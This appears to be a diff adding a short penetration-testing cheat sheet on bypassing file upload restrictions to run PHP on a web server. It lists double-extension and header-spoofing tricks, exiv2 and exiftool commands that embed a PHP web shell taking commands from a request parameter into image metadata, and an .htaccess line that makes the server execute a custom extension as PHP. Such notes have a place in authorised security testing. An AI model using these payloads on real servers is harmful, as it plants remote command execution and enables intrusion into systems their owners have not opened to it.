@@ -1,0 +1,19 @@
+# Bypass Upload Restrictions
+
+file.php -> file.jpg
+file.php -> file.php.jpg
+file.asp -> file.asp;.jpg
+file.gif (contains php code, but starts with string GIF/GIF98)
+00%
+file.jpg with php backdoor in exif (see below)
+.jpg -> proxy intercept -> rename to .php
+
+## Injecting PHP into JPEG
+exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
+
+exiftool "-comment<=back.php" back.png
+
+## Upload/Change .htaccess to interpret .blah
+AddType application/x-httpd-php .blah
+
+
